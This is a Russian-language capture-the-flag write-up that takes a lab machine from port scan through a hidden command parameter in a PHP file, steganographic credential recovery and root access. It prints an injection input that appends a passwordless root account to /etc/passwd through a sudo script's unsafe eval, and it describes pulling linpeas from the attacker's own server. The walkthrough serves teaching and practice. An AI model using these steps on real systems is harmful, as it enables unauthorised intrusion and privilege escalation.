### ДЛЯ РЕШЕНИЯ НЕОБХОДИМО
- базовое понимание стеганографии
- фаззить
- базовое понимание бэша
### ВЗЯТИЕ ШЕЛЛА
по классике сначала сканим порты через rustscan. видим, что все по стандарту
```
rustscan --ulimit 5000 --range 0-65535 -a ip -- -sC -sV.
----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.|
 {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| ||
 .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |`
-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'T
ustScan: Because guessing isn't hacking.[
pen 10.49.177.110:22O
pen 10.49.177.110:80
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|  ...
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: U.A. High School
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
делать нечего - переходим на сайт и параллельно фаззим. в коде страниц/на страницах ничего интересного не нашла. есть одна форма, она даже реально отправляется(проверила через бурп), но через нее ничего не провернуть

<img width="1462" height="487" alt="image" src="https://github.com/user-attachments/assets/600b8ab4-3fe9-42d9-b7c2-a100122532a1" />

при фаззинге ничего сразу бросающегося в глаза нет, но как вариант - посмотреть, что происходит в поддиректории assets
```
ffuf -u http://ip/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt:FUZZ -e .php,.html -ic -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

about.html              [Status: 200, Size: 2542, Words: 276, Lines: 53, Duration: 389ms]
admissions.html         [Status: 200, Size: 2573, Words: 232, Lines: 64, Duration: 1435ms]
assets                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 299ms]
contact.html            [Status: 200, Size: 2056, Words: 142, Lines: 72, Duration: 246ms]
courses.html            [Status: 200, Size: 2580, Words: 180, Lines: 88, Duration: 243ms]
index.html              [Status: 200, Size: 1988, Words: 171, Lines: 62, Duration: 277ms]
```
страница по этому адресу пустая, скорее всего там заглушка (index.html 0 байт, предотвращает листинг директории. если бы пустого файла не было, сервер мог бы показать список всех файлов в папке assets, или выдать ошибку 403 Forbidden. пустой файл — это способ скрыть содержимое папки, отдавая статус 200 OK. многие cms создают такие на автомате во всех внутренних директориях). Значит, вполне возможно, что в этой директории могут лежать полезные файлы - пофаззим. и не зря! хотя результат удивил: 

```
images                  [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 194ms]
index.php               [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 191ms]
```

здесь у нас лежит исполняемый файл index.php (что нестандартно, но тоже иногда используют как заглушку). но также есть вероятность, что скрипт что-то выполняет и принимает скрытые параметры. попробуем пофаззить 

```
ffuf -u "http://ip/assets/index.php?FUZZ=id" -w /usr/share/wordlists/dirb/common.txt -fs 0
```

и да, скрипт действительно принимает параметр cmd, выдавая ответ в base64

<img width="872" height="124" alt="image" src="https://github.com/user-attachments/assets/d0322974-6824-4c8d-bf10-f99e32d168dc" />

очевидно, что это хорошая возможность опрокинуть себе реверсшелл, но перед этим прочитала index.php (через бурп), чтобы убедиться в логике работы кода. фильтрации у параметра нет, проблем нет

<img width="1920" height="527" alt="image" src="https://github.com/user-attachments/assets/31465981-b24d-43a5-8600-283849c0afa6" />

### ВЗЯТИЕ ЮЗЕРА

и вот, мы оказались внутри с правами www-data. пока работал линпис (открываем у себя на машине питоновский сервер, через wget подгружаем linpeas на сервер в папку /tmp), слегка погуляла по системе. из интересного - в /etc/passwd мы узнаем, что есть некий пользователь deku, которого, полагаю, нам и надо взять, чтобы получить рута. также нашла загадочный файл с закодированной на base64 фразой
```
www-data@ip-10-49-177-110:/var/www/Hidden_Content$ cat passphrase.txt
QWxsb...
```
попыталась использовать ее как пароль к deku, но не прокатило. но passphrase обычно встречается при извлечении зашитых данных из картинок. попробуем посмотреть картинки в assets. скачала к себе на машину (подняв питоновский сервер), чтобы прогнать через steghide, используя найденную парольную фразу. в картинке ```yuei.jpg``` ничего, но ```oneforall.jpg``` битая и steghide выдает ошибку. попробуем посмотреть, где ее так помотало, через ```hexeditor```. видим вот такую картину: 

```
File: oneforall.jpg.1                                       ASCII Offset: 0x00000010 / 0x00017FD7 (%00)   
00000000  89 50 4E 47  0D 0A 1A 0A   00 00 00 01  01 00 00 01                             .PNG............
```

магические байты не соответствую формату (jpg). попробовала два варианта: 1) изменить расширение на png и прогнать через zsteg (файл заканчивается на ```FF D9```, что является признаком jpg, так что надо заменить еще и конец на ```00 00 00 00 49 45 4E 44 AE 42 60 82``` (стандартное окончание png файлов), хотя, сразу скажу, вариант не сработал) 2) поменять магические байты
- ```FF D8 FF DB``` (jpg без метаданных)
- ```FF D8 FF EE``` (маркер APP14, зарезервированный компанией Adobe)
- ```FF D8 FF E1 ?? ?? 45 78 69 66 00 00``` (EXIF-файл (фотография с камеры или смартфона, ?? - длина сегмента))
- ```FF D8 FF E0 00 10 4A 46 49 46 00 01```, ```FF D8 FF E0```(=jfif, обычной картинке из инета))

скорее всего, нам понадобится jfif. и да, отредактировав байты через ```hexeditor``` (поменяв на ```FF D8 FF E0 00 10 4A 46 49 46 00 01```) файл починился
```
sudo steghide extract -sf oneforall.jpg 
Enter passphrase: 
wrote extracted data to "creds.txt".
```
получаем креды и подключаемся с правами деку

### ВЗЯТИЕ РУТА

в выводе sudo -l увидела интересную штуку
```
User deku may run the following commands on ip:
    (ALL) /opt/NewComponent/feedback.sh
```
посмотрим скрипт, который мы можем выполнять от рута. редактировать мы файл не можем, хотя deku и является его владельцем
```
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback


if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input." 
fi
```
в скрипте есть eval и никакой нормальной фильтрации переменных - красный флаг. раз мы можем регулировать переменную, то просто создадим нового юзера 
```
deku@ip:/opt/NewComponent$ sudo ./feedback.sh
Hello, Welcome to the Report Form       
This is a way to report various problems
    Developed by                        
        The Technical Department of U.A.
Enter your feedback:
"user::0:0:root:/root:/bin/bash" >> /etc/passwd
It is This:
Feedback successfully saved.
```
проверяем /etc/passwd и видим, что мы действительно создали пользователя user с правами root без пароля. меняем пользователя и забираем флаг!)
<img width="413" height="84" alt="image" src="https://github.com/user-attachments/assets/0e5241d1-5a64-493a-afd7-92fc7ace4b9c" />
